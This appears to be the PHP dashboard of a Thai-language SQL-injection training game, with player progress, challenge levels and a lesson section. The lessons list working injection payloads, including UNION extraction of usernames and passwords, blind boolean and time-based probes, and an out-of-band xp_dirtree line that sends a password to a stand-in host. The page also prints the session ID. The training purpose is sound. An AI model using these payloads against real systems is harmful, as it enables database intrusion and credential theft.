<?php
session_start();
if (!isset($_SESSION['player_id'])) { 
    header("Location: login_real.php"); 
    exit(); 
}

require_once "connect.php";

/* -------------------
   PLAYER DATA
------------------- */

$res = pg_query_params(
    $conn,
    "SELECT * FROM players WHERE id=$1",
    [$_SESSION['player_id']]
);

$player = pg_fetch_assoc($res);

$level_reached = $player['level_reached'] ?? 1;
$total_score   = $player['score'] ?? 0;
$user_role     = (int)($player['role'] ?? 0);

/* -------------------
   TOTAL LEVELS
------------------- */

$res_total = pg_query($conn,"SELECT COUNT(*) FROM challenges");
$row_total = pg_fetch_row($res_total);
$total_levels = $row_total[0] ?: 1;
// ล็อคค่าไว้ไม่ให้เกิน 100% แม้ข้อมูลใน DB จะผิดพลาด
$progress_pct = min(100, round((($level_reached - 1) / $total_levels) * 100));

/* -------------------
   LOAD CHALLENGES
------------------- */

$challenges_res = pg_query($conn,"SELECT * FROM challenges ORDER BY level_num ASC");

?>

<!DOCTYPE html>
<html lang="th">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Hacker King | Dashboard & Academy</title>
    <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;600&family=Orbitron:wght@400;700&family=Sarabun:wght@300;400;600&display=swap" rel="stylesheet">
    <style>
        :root {
            --primary: #a855f7; --primary-glow: rgba(168, 85, 247, 0.6);
            --secondary: #22d3ee; --success: #10b981; --danger: #ff4757;
            --warning: #fbbf24; --dark-bg: #020617; --card-bg: rgba(15, 23, 42, 0.95);
            --border: #334155; --terminal-green: #4ade80;
        }
        body {
            font-family: 'Sarabun', sans-serif; background: var(--dark-bg); color: #e2e8f0; margin: 0;
            background-image: radial-gradient(circle at 50% 50%, #1e1b4b 0%, #020617 100%);
            overflow-x: hidden;
        }
        body::before {
            content: " "; position: fixed; top: 0; left: 0; bottom: 0; right: 0;
            background: linear-gradient(rgba(18, 16, 16, 0) 50%, rgba(0, 0, 0, 0.25) 50%), 
                        linear-gradient(90deg, rgba(255, 0, 0, 0.06), rgba(0, 255, 0, 0.02), rgba(0, 0, 255, 0.06));
            z-index: 1000; background-size: 100% 2px, 3px 100%; pointer-events: none;
        }
        .navbar { height: 70px; background: rgba(2, 6, 23, 0.8); backdrop-filter: blur(10px); border-bottom: 1px solid var(--primary); display: flex; align-items: center; justify-content: space-between; padding: 0 40px; position: sticky; top: 0; z-index: 100; }
        .brand { font-family: 'Orbitron', sans-serif; font-weight: 700; font-size: 22px; color: var(--primary); text-shadow: 0 0 10px var(--primary); }
        .nav-actions { display: flex; align-items: center; gap: 10px; }
        .btn-nav { text-decoration: none; font-family: 'Fira Code', monospace; font-size: 11px; padding: 6px 12px; transition: 0.3s; border-radius: 2px; }
        .btn-admin { color: var(--danger); border: 1px solid var(--danger); }
        .btn-admin:hover { background: var(--danger); color: #fff; box-shadow: 0 0 10px var(--danger); }
        .btn-academy { color: var(--secondary); border: 1px solid var(--secondary); }
        .btn-logout { color: #64748b; border: 1px solid #334155; }
        
        .container { max-width: 1200px; margin: 40px auto; padding: 0 20px; position: relative; z-index: 1; }
        .hero-grid { display: grid; grid-template-columns: 2fr 1fr; gap: 20px; margin-bottom: 40px; }
        .welcome-card { background: var(--card-bg); border: 1px solid var(--border); padding: 30px; border-left: 5px solid var(--primary); }
        .welcome-card h1 { font-family: 'Orbitron', sans-serif; color: var(--secondary); margin: 10px 0; font-size: 28px; }
        .progress-container {
    width: 100%;       /* ให้ขยายเต็มที่ในพื้นที่ที่ได้รับ */
    max-width: 600px;  /* แต่ห้ามยาวเกิน 600px (ปรับเลขตามชอบ) */
    background: rgba(255, 255, 255, 0.1);
    border-radius: 10px;
    overflow: hidden;   /* กันตัวหลอดข้างในล้นออกมา */
}

/* บรรทัดที่ 84 ในโค้ดของคุณ */
.progress-bar { 
    height: 8px; 
    background: linear-gradient(90deg, var(--primary), var(--secondary)); 
    box-shadow: 0 0 15px var(--primary); 
    transition: width 1s ease-in-out; 
    max-width: 100%; /* เพิ่มบรรทัดนี้เข้าไปเพื่อป้องกันหลอดทะลุ */
}
        .stats-box { background: var(--card-bg); border: 1px solid var(--border); padding: 20px; display: flex; flex-direction: column; gap: 15px; justify-content: center; }
        .stat-item { text-align: center; }
        .stat-label { font-size: 10px; color: #94a3b8; font-family: 'Fira Code'; text-transform: uppercase; }
        .stat-val { font-family: 'Orbitron', sans-serif; font-size: 28px; color: var(--warning); text-shadow: 0 0 10px var(--warning); }

        /* Academy Section */
        .academy-section { margin-top: 60px; margin-bottom: 40px; }
        .academy-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 20px; }
        .lesson-card { background: rgba(15, 23, 42, 0.6); border: 1px solid var(--border); padding: 20px; border-radius: 4px; transition: 0.3s; }
        .lesson-card:hover { border-color: var(--secondary); background: rgba(34, 211, 238, 0.05); }
        .lesson-card h3 { font-family: 'Orbitron'; font-size: 14px; color: var(--secondary); margin-top: 0; }
        .lesson-card code { background: #000; color: var(--terminal-green); padding: 2px 6px; border-radius: 3px; font-size: 12px; }

        /* Level Grid */
        .level-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(240px, 1fr)); gap: 20px; }
        .level-card { background: var(--card-bg); border: 1px solid var(--border); padding: 25px; text-align: center; transition: 0.4s; position: relative; overflow: hidden; }
        .level-card.unlocked { border-color: var(--border); }
        .level-card.unlocked:hover { transform: translateY(-5px); border-color: var(--primary); box-shadow: 0 10px 30px -10px var(--primary-glow); }
        .level-card.completed { border-bottom: 4px solid var(--success); }
        .level-icon { font-size: 32px; margin-bottom: 15px; display: block; opacity: 0.8; }
        .level-name { font-family: 'Orbitron', sans-serif; font-size: 15px; color: #fff; margin-bottom: 10px; }
        .btn-enter { display: block; width: 100%; margin-top: 20px; padding: 10px 0; background: transparent; border: 1px solid var(--secondary); color: var(--secondary); text-decoration: none; font-family: 'Fira Code'; font-size: 12px; transition: 0.3s; font-weight: bold; }
        .btn-enter:hover { background: var(--secondary); color: #000; }
        .locked-overlay { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: rgba(2, 6, 23, 0.85); display: flex; flex-direction: column; align-items: center; justify-content: center; z-index: 2; backdrop-filter: blur(2px); }
        
        .section-title { font-family: 'Orbitron'; font-size: 18px; color: var(--primary); margin-bottom: 25px; display: flex; align-items: center; gap: 15px; }
        .section-title::after { content: ""; height: 1px; background: var(--border); flex-grow: 1; }

        .cheat-sheet { margin-top: 50px; background: rgba(0, 0, 0, 0.4); border: 1px solid var(--border); font-family: 'Fira Code', monospace; }
        .cheat-header { background: #1e293b; padding: 8px 20px; color: var(--warning); font-size: 12px; }
        .cheat-body { padding: 15px 20px; display: flex; justify-content: space-between; font-size: 12px; color: #64748b; }
    
    
    
    
    /* -------------------------
   MOBILE RESPONSIVE
------------------------- */

@media (max-width: 900px){

.hero-grid{
    grid-template-columns:1fr;
}

.navbar{
    flex-direction:column;
    height:auto;
    padding:15px;
    gap:10px;
}

.nav-actions{
    flex-wrap:wrap;
    justify-content:center;
}

.container{
    margin:20px auto;
}

}


/* ---------- SMALL MOBILE (4xx px) ---------- */

@media (max-width:480px){

.brand{
    font-size:18px;
}

.welcome-card h1{
    font-size:22px;
}

.level-grid{
    grid-template-columns:1fr;
}

.academy-grid{
    grid-template-columns:1fr;
}

.lesson-card{
    padding:15px;
}

.stats-box{
    flex-direction:row;
    justify-content:space-around;
}

.stat-val{
    font-size:22px;
}

.cheat-body{
    flex-direction:column;
    gap:10px;
    text-align:center;
}

.btn-nav{
    font-size:10px;
    padding:5px 8px;
}

}
    </style>
</head>
<body>

<nav class="navbar">
    <div class="brand">HACKER_KING://DB</div>
    <div class="nav-actions">
        <?php if ($user_role === 1): ?>
            <a href="admin.php" class="btn-nav btn-admin">[ ROOT_CONSOLE ]</a>
            <a href="view_db.php" class="btn-nav" style="color: var(--secondary); border: 1px solid var(--secondary);">[ DB_EXPLORER ]</a>
        <?php endif; ?>
<a href="handbook.php" class="btn-nav btn-academy">[ VIEW_HANDBOOK_DB ]</a>
        <a href="#academy" class="btn-nav btn-academy">[ ACADEMY ]</a>
        <a href="leaderboard.php" class="btn-nav" style="color: var(--warning); border: 1px solid var(--warning);">[ RANKING ]</a>
        <a href="logout.php" class="btn-nav btn-logout">SHUTDOWN</a>
    </div>
</nav>

<div class="container">
    <div class="hero-grid">
        <div class="welcome-card">
            <div style="font-family: 'Fira Code'; font-size: 11px; color: var(--primary);">ID_TOKEN: <?php echo session_id(); ?></div>
            <h1>WELCOME_OPERATOR: <?php echo htmlspecialchars($_SESSION['player_name']); ?></h1>
            <p style="color: #94a3b8; font-size: 14px; line-height: 1.6;">
                ระบบกำลังตรวจสอบช่องโหว่... กรุณาเลือกเป้าหมายที่ปลดล็อคแล้วเพื่อเริ่มการโจมตี 
                หากคุณติดขัด สามารถศึกษาเทคนิคได้ที่ <span style="color:var(--secondary);">Hacker Academy</span> ด้านล่าง
            </p>
            <div class="progress-container">
                <div class="progress-bar" style="width: <?php echo $progress_pct; ?>%"></div>
            </div>
            <div style="text-align: right; font-family: 'Fira Code'; font-size: 11px; margin-top: 8px; color: var(--secondary);">
                BREACH_PROGRESS: <?php echo $progress_pct; ?>%
            </div>
        </div>

        <div class="stats-box">
            <div class="stat-item">
                <div class="stat-label">CURRENT_SCORE</div>
                <div class="stat-val"><?php echo number_format($total_score); ?></div>
            </div>
            <div style="height: 1px; background: var(--border); width: 50%; margin: 0 auto;"></div>
            <div class="stat-item">
                <div class="stat-label">MISSION_CLEARED</div>
                <div class="stat-val"><?php echo ($level_reached - 1); ?> <span style="font-size: 14px; color: #444;">/ <?php echo $total_levels; ?></span></div>
            </div>
        </div>
    </div>

    <h2 class="section-title">ACTIVE_TARGET_LIST</h2>
    <div class="level-grid">
        <?php
while ($row = pg_fetch_assoc($challenges_res)):
            $i = $row['level_num'];
            $is_unlocked = $i <= $level_reached;
            $is_completed = $i < $level_reached;
            
            // Emoji Logic
            $emoji = "📡";
            if (strpos(strtolower($row['title']), 'string') !== false) $emoji = "💉";
            else if (strpos(strtolower($row['title']), 'numeric') !== false) $emoji = "🔢";
            else if ($i >= 5) $emoji = "💀";
        ?>
            <div class="level-card <?php echo $is_unlocked ? 'unlocked' : ''; ?> <?php echo $is_completed ? 'completed' : ''; ?>">
                <?php if(!$is_unlocked): ?>
                    <div class="locked-overlay">
                        <span style="font-size: 30px;">🔒</span>
                        <div style="font-size: 10px; margin-top: 10px; color: var(--danger); font-family: 'Fira Code';">ACCESS_DENIED</div>
                    </div>
                <?php endif; ?>
                
                <span class="level-icon"><?php echo $emoji; ?></span>
                <div class="level-name"><?php echo htmlspecialchars($row['title']); ?></div>
                <div style="font-size: 11px; color: #64748b; line-height: 1.4; min-height: 45px;">
                    <?php echo htmlspecialchars($row['description']); ?>
                </div>

                <?php if($is_unlocked): ?>
                    <a href="index.php?level=<?php echo $i; ?>" class="btn-enter">
                        <?php echo $is_completed ? 'RE-RUN_EXPLOIT' : 'EXECUTE_PAYLOAD'; ?>
                    </a>
                <?php endif; ?>
            </div>
        <?php endwhile; ?>
    </div>

    
    <h2 id="academy" class="section-title" style="margin-top: 80px; color: var(--secondary);">HACKER_ACADEMY_DATABASE</h2>
<div class="academy-grid">
        <div class="lesson-card">
            <h3>0x01: STRING_INJECTION</h3>
            <p style="font-size: 12px; color: #94a3b8; line-height: 1.6;">
                ใช้เมื่อช่องกรอกข้อมูลถูกครอบด้วย Single Quote ('). เราต้องทำการ "Break" โครงสร้างออกมา<br>
                <strong>Payload:</strong> <code>' OR 1=1 --</code> <br>
                <strong>Logic:</strong> ทำให้คำสั่ง SQL กลายเป็น <code>WHERE user = ' OR 1=1 --</code> ซึ่งจะเป็นจริงเสมอ
            </p>
        </div>
        <div class="lesson-card">
            <h3>0x02: NUMERIC_INJECTION</h3>
            <p style="font-size: 12px; color: #94a3b8; line-height: 1.6;">
                ใช้กับช่องกรอกที่เป็นตัวเลข (เช่น ID) ซึ่งไม่มีเครื่องหมาย Quote ครอบไว้<br>
                <strong>Payload:</strong> <code>1 OR 1=1</code> <br>
                <strong>Logic:</strong> คำสั่งจะกลายเป็น <code>WHERE id = 1 OR 1=1</code> ทำให้ระบบดึงข้อมูลออกมาทั้งหมดโดยไม่ต้องรู้ ID จริง
            </p>
        </div>
        <div class="lesson-card">
            <h3>0x03: SQL_COMMENTS</h3>
            <p style="font-size: 12px; color: #94a3b8; line-height: 1.6;">
                การใช้ Comment เพื่อตัดคำสั่ง SQL ส่วนเกินที่ระบบเขียนไว้ (เช่น การเช็ครหัสผ่าน)<br>
                <strong>Payload:</strong> <code>admin' -- </code> หรือ <code>admin' #</code> <br>
                <strong>Tip:</strong> การใส่ช่องว่างหลัง <code>--</code> สำคัญมากในบางระบบ
            </p>
        </div>
        <div class="lesson-card">
            <h3>0x04: COLUMN_COUNT_ORDER_BY</h3>
            <p style="font-size: 12px; color: #94a3b8; line-height: 1.6;">
                ใช้หาจำนวนคอลัมน์ที่ระบบดึงมาแสดงผล เพื่อเตรียมทำ UNION ต่อไป<br>
                <strong>Payload:</strong> <code>1 ORDER BY 5--</code><br>
                <strong>Logic:</strong> ถ้าใส่เลข 5 แล้ว Error แต่เลข 4 ปกติ แสดงว่าหน้าเว็บดึงมา 4 คอลัมน์
            </p>
        </div>

        <div class="lesson-card">
            <h3>0x05: UNION_IDENTIFICATION</h3>
            <p style="font-size: 12px; color: #94a3b8; line-height: 1.6;">
                หาจุดที่ข้อมูลโผล่บนหน้าจอโดยใช้ UNION SELECT<br>
                <strong>Payload:</strong> <code>-1' UNION SELECT 1,2,3,4 --</code><br>
                <strong>Logic:</strong> ใส่ -1 เพื่อลบข้อมูลจริงออก แล้วดูว่าเลข 1, 2, 3 หรือ 4 ไปโผล่ตรงไหนของหน้าเว็บ
            </p>
        </div>

        <div class="lesson-card">
            <h3>0x06: DATA_EXTRACTION_CONCAT</h3>
            <p style="font-size: 12px; color: #94a3b8; line-height: 1.6;">
                ดึงข้อมูลหลายอย่างพร้อมกันในช่องแสดงผลเดียว<br>
                <strong>Payload:</strong> <code>' UNION SELECT 1,CONCAT(user,':',pass),3,4 FROM users --</code><br>
                <strong>Logic:</strong> ใช้ฟังก์ชัน CONCAT รวมชื่อและรหัสผ่านเข้าด้วยกันเป็นก้อนเดียว
            </p>
        </div>

        <div class="lesson-card">
            <h3>0x07: BLIND_BOOLEAN_BASED</h3>
            <p style="font-size: 12px; color: #94a3b8; line-height: 1.6;">
                ใช้เมื่อเว็บไม่โชว์ Error แต่ตอบสนองต่างกัน (เช่น พบ/ไม่พบ ยูสเซอร์)<br>
                <strong>Payload:</strong> <code>' AND SUBSTR((SELECT pass FROM users LIMIT 1),1,1) = 'a' --</code><br>
                <strong>Logic:</strong> เช็คทีละตัวอักษร ถ้าเว็บตอบว่า "พบ" แสดงว่าตัวอักษรนั้นถูกต้อง
            </p>
        </div>

        <div class="lesson-card">
            <h3>0x08: BLIND_TIME_BASED</h3>
            <p style="font-size: 12px; color: #94a3b8; line-height: 1.6;">
                ใช้เมื่อเว็บนิ่งสนิท ไม่มีความต่างใดๆ ให้เห็นนอกจาก "เวลาในการโหลด"<br>
                <strong>Payload:</strong> <code>' AND IF(SUBSTR(database(),1,1)='s', SLEEP(5), 1) --</code><br>
                <strong>Logic:</strong> ถ้าระบบค้างไป 5 วินาที แสดงว่าเงื่อนไขที่เราเดานั้นเป็นจริง
            </p>
        </div>

        <div class="lesson-card">
            <h3>0x09: SECOND_ORDER_SQLI</h3>
            <p style="font-size: 12px; color: #94a3b8; line-height: 1.6;">
                การฉีดคำสั่งทิ้งไว้ในฐานข้อมูล เพื่อให้ไปทำงานในขั้นตอนถัดไป (เช่น หน้าโปรไฟล์)<br>
                <strong>Attack:</strong> สมัครชื่อ <code>admin'--</code> แล้วไปกดเปลี่ยนรหัสผ่านในหน้า Setting<br>
                <strong>Logic:</strong> คำสั่งที่ฝังอยู่จะไปตัดตอน Query อื่น ทำให้เราคุมบัญชี Admin ได้
            </p>
        </div>

        <div class="lesson-card">
            <h3>0x10: OUT_OF_BAND_OOB</h3>
            <p style="font-size: 12px; color: #94a3b8; line-height: 1.6;">
                สั่งให้ Database ส่งข้อมูลออกไปหาเครื่องเราโดยตรงผ่าน DNS หรือ HTTP<br>
                <strong>Payload:</strong> <code>'; EXEC xp_dirtree '\\' + (SELECT pass FROM users LIMIT 1) + '.your-dns.com\a' --</code><br>
                <strong>Logic:</strong> ข้อมูลจะวิ่งไปโผล่ใน Log ของ Server เราเอง (เช่น pass123.your-dns.com)
            </p>
        </div>
    </div>

    <div class="cheat-sheet">
        <div class="cheat-header">DASHBOARD_SYSTEM_INFO.LOG</div>
        <div class="cheat-body">
            <div>STATUS: <span style="color: var(--success);">ONLINE</span> | KERNEL: V3-FLASH-IMAGE</div>
            <div>
                <a href="leaderboard.php" style="color: var(--warning); text-decoration: none;">[ ACCESS_LEADERBOARD ]</a>
            </div>
        </div>
    </div>
</div>

</body>
</html>